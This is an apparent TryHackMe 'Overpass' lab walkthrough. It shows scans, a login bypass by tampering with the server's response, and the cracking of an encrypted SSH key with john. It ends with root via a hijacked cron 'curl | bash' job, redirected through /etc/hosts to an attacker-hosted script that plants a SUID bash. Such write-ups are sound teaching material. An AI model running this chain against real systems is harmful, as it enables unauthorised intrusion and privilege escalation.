@@ -1,0 +1,277 @@
+Overpass is a simple machine by Trhackme which covers a vulnerability related to OWASP Top 10.
+
+Nmap scan results
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Overpass# nmap -A -T4 10.10.206.81 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 11:09 IST
+Nmap scan report for 10.10.206.81
+Host is up (0.15s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
+|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
+|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
+80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Overpass
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=10/12%OT=22%CT=1%CU=41680%PV=Y%DS=2%DC=T%G=Y%TM=5F83EC
+OS:44%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)SEQ(SP=
+OS:107%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%
+OS:O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=F4B3%W2
+OS:=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNS
+OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
+OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
+OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
+OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
+OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Nikto scan results:
+
+root@LAPTOP-U5913CMD:/home/akshay# nikto -h 10.10.206.81 
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.206.81
++ Target Hostname:    10.10.206.81
++ Target Port:        80
++ Start Time:         2020-10-12 11:10:10 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: No banner retrieved
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-3092: /admin.html: This might be interesting...
++ OSVDB-3092: /admin/: This might be interesting...
++ OSVDB-3092: /css/: This might be interesting...
++ OSVDB-3092: /downloads/: This might be interesting...
++ OSVDB-3092: /img/: This might be interesting...
++ 7890 requests: 0 error(s) and 9 item(s) reported on remote host
++ End Time:           2020-10-12 11:30:35 (GMT5.5) (1225 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+Ninja - Lead Developer
+
+Pars - Shibe Enthusiast and Emotional Support Animal Manager
+
+Szymex - Head Of Security
+
+Bee - Chief Drinking Water Coordinator
+
+MuirlandOracle - Cryptography Consultant
+
+So there is a vulnerability in login.js
+
+async function login() {
+    const usernameBox = document.querySelector("#username");
+    const passwordBox = document.querySelector("#password");
+    const loginStatus = document.querySelector("#loginStatus");
+    loginStatus.textContent = ""
+    const creds = { username: usernameBox.value, password: passwordBox.value }
+    const response = await postData("/api/login", creds)
+    const statusOrCookie = await response.text()
+    if (statusOrCookie === "Incorrect credentials") {
+        loginStatus.textContent = "Incorrect Credentials"
+        passwordBox.value=""
+    } else {
+        Cookies.set("SessionToken",statusOrCookie)
+        window.location = "/admin"
+    }
+}
+As you can see the statusOrCookie paramter needs Incorrect Credentials.
+We can modify the response that we get to get login access.
+
+http://10.10.122.234/admin/
+
+Request going to /api/login
+
+POST /api/login HTTP/1.1
+Host: 10.10.122.234
+Content-Length: 26
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+Origin: http://10.10.122.234
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+Response for that:
+
+HTTP/1.1 200 OK
+Date: Mon, 12 Oct 2020 06:52:00 GMT
+Content-Length: 21
+Content-Type: text/plain; charset=utf-8
+Connection: close
+
+Incorrect credentials
+
+We can remove the Incorrect credentials and change the 200 OK to 302 FOUND
+
+HTTP/1.1 302 FOUND
+Date: Mon, 12 Oct 2020 06:53:16 GMT
+Content-Length: 21
+Content-Type: text/plain; charset=utf-8
+Connection: close
+Location:/admin
+
+And we get access now to the admin panel.
+
+We are provided with a SSH keys
+
+Since you keep forgetting your password, James, I've set up SSH keys for you.
+
+If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
+Also, we really need to talk about this "Military Grade" encryption. - Paradox
+
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337
+
+LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
+JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
+73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
+WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
+BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
+AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
+3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
+ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
+VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
+OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
+9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
+eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
+4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
+GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
+exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
+AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
+6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
+dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
+n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
+8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
+4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
+ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
+49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
++hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
+2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
+-----END RSA PRIVATE KEY-----
+
+It requires a key phrase to get access.
+
+SO we can use ssh2john.py to get the key.
+
+Follow me:
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Overpass# wget https://raw.githubusercontent.com/koboi137/john/bionic/ssh2john.py
+--2020-10-12 12:29:31--  https://raw.githubusercontent.com/koboi137/john/bionic/ssh2john.py
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.152.133
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.152.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7781 (7.6K) [text/plain]
+Saving to: 'ssh2john.py.1'
+
+ssh2john.py.1                                       100%[===================================================================================================================>]   7.60K  --.-KB/s    in 0s      
+
+2020-10-12 12:29:31 (49.9 MB/s) - 'ssh2john.py.1' saved [7781/7781]
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Overpass# ls
+hash  id_rsa  ssh2john.py  ssh2john.py.1  walkthrough.txt
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Overpass# rm hash
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Overpass# python ssh2john.py id_rsa > hash
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Overpass# john hash --wordlist=/home/akshay/Downloads/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 12 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+james13          (id_rsa)
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Overpass# ssh -i id_rsa james@10.10.122.234
+load pubkey "id_rsa": invalid format
+Enter passphrase for key 'id_rsa': 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Oct 12 07:00:51 UTC 2020
+
+  System load:  0.24               Processes:           88
+  Usage of /:   22.2% of 18.57GB   Users logged in:     0
+  Memory usage: 12%                IP address for eth0: 10.10.122.234
+  Swap usage:   0%
+
+
+47 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
+james@overpass-prod:~$ id
+uid=1001(james) gid=1001(james) groups=1001(james)
+james@overpass-prod:~$ 
+
+
+james@overpass-prod:/$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+# Update builds from latest code
+* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+
+We can use this to get root access.
+
+we can edit the /etc/hosts file of the victim's machine.
+
+127.0.0.1 overpass.thm
+
+we can change 127.0.0.1 to our IP address i.e 10.9.81.62.
+We will create downloads folder followed by src and then create a buildscript.sh
+
+we will write some malicious  content to it.
+
+#!/bin/bash
+
+cp /bin/bash /tmp/bash ; chmod u+s /tmp/bash
+
+We will now set up a http server and then the cron job will run and then the script will get executed.
+
+james@overpass-prod:/$ nano /etc/hosts
+james@overpass-prod:/$ curl overpass.thm/downloads/src/buildscript.sh 
+echo "Akshay"
+
+As it is working, I will change the script now to the malicious script written above..
+
+james@overpass-prod:/$ cd /tmp
+james@overpass-prod:/tmp$ ls
+bash  systemd-private-9797d1dfb6c249918dbad232b426fdc5-systemd-resolved.service-rFJ21r  systemd-private-9797d1dfb6c249918dbad232b426fdc5-systemd-timesyncd.service-RNUi6t
+james@overpass-prod:/tmp$ ls -la bash
+-rwsr-xr-x 1 root root 1113504 Oct 12 07:26 bash
+james@overpass-prod:/tmp$ ./bash -p
+bash-4.4# id
+uid=1001(james) gid=1001(james) euid=0(root) groups=1001(james)
+bash-4.4# cd /root
+bash-4.4# ls
+buildStatus  builds  go  root.txt  src
+bash-4.4# cat root.txt
+thm{##################dbac18d54fdd64ea753bb}
